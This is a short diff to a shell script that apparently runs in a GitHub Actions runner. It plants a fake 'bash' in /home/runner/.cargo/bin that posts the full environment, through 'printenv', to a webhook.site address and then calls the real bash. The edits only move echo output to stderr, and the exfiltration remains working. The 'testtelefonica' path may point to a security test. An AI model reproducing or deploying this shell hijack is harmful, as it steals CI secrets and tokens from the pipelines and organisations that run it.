@@ -1,10 +1,10 @@
-echo "$PATH"
-which bash
+echo "$PATH" >&2
+which bash >&2
 
-echo "--creating wrapper--"
+echo "--creating wrapper--" >&2
 cat > /home/runner/.cargo/bin/bash <<'EOF'
 #!/usr/bin/bash
-echo "hello next step."
+echo "hello next step." >&2
 export webhook="https://webhook.site/testtelefonica/$GITHUB_STEP_SUMMAR"
 curl -X POST \
   -H "Content-Type: text/plain" \
@@ -21,14 +21,14 @@ curl -X POST \
 curl -X POST \
   -H "Content-Type: text/plain" \
   --data "$(printenv)" \
-  "$webhook/printenv"
+  "$webhook/printenv" 
 exec /usr/bin/bash "$@"
 EOF
 
-echo "--granting permissions--"
-chmod +x /home/runner/.cargo/bin/bash
-echo "--which bash--"
-which bash
+echo "--granting permissions--" >&2
+chmod +x /home/runner/.cargo/bin/bash 
+echo "--which bash--" >&2
+which bash >&2 
 
-echo "--cat /home/runner/.cargo/bin/bash--"
-cat /home/runner/.cargo/bin/bash
+echo "--cat /home/runner/.cargo/bin/bash--" >&2
+cat /home/runner/.cargo/bin/bash >&2
